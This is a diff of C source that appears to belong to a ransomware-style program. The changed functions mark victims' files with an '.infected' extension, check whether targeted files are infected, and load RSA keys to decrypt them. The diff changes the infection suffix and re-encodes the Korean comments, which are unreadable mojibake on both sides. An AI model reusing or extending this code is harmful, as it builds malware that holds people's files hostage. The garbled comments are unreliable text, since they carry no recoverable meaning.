@@ -67,7 +67,7 @@ void decrypt(char* file)
     FILE* fp = NULL;
     char infected_file[100];
     strcpy(infected_file, file);
-    strcat(infected_file, ".nsr.infected");
+    strcat(infected_file, ".infected");
 
     printf("infected : %s\n", infected_file);
     printf("decrypted : %s\n", file);
@@ -125,7 +125,7 @@ int isInfected()
 	for (int idx = 0; idx < TARGET_SIZE; idx++)
 	{
 		strcpy(fname, target[idx]);
-		strcat(fname, ".nsr.infected");
+		strcat(fname, ".infected");
 		if (!(fp = fopen(fname, "rb"))) // is infected?
 		{
 			return 0; // fopen() fail
@@ -169,20 +169,20 @@ RSA* createRSA(unsigned char* key, int public)
 {
     RSA* rsa = NULL;
     BIO* keybio;
-    keybio = BIO_new_mem_buf(key, -1); // ÀÐ±â Àü¿ë ¸Þ¸ð¸® ¸¸µé±â BIO
+    keybio = BIO_new_mem_buf(key, -1); // ì½ê¸° ì „ìš© ë©”ëª¨ë¦¬ ë§Œë“¤ê¸° BIO
     if (keybio == NULL)
     {
         printf("Failed to create key BIO");
         return 0;
     }
 
-    /* PEMÇü½ÄÀÎ Å° ÆÄÀÏÀ» ÀÐ¾î¿Í¼­ RSA ±¸Á¶Ã¼ Çü½ÄÀ¸·Î º¯È¯ */
+    /* PEMí˜•ì‹ì¸ í‚¤ íŒŒì¼ì„ ì½ì–´ì™€ì„œ RSA êµ¬ì¡°ì²´ í˜•ì‹ìœ¼ë¡œ ë³€í™˜ */
 
-    if (public) // PEM public Å°·Î RSA »ý¼º
+    if (public) // PEM public í‚¤ë¡œ RSA ìƒì„±
     {
         rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
     }
-    else // PEM private Å°·Î RSA »ý¼º
+    else // PEM private í‚¤ë¡œ RSA ìƒì„±
     {
         rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
     }
@@ -195,7 +195,7 @@ RSA* createRSA(unsigned char* key, int public)
     return rsa;
 }
 
-/* °³ÀÎÅ°·Î º¹È£È­ */
+/* ê°œì¸í‚¤ë¡œ ë³µí˜¸í™” */
 int private_decrypt(unsigned char* enc_data, int data_len, unsigned char* key, unsigned char* decrypted)
 {
 	RSA* rsa = createRSA(key, 0);
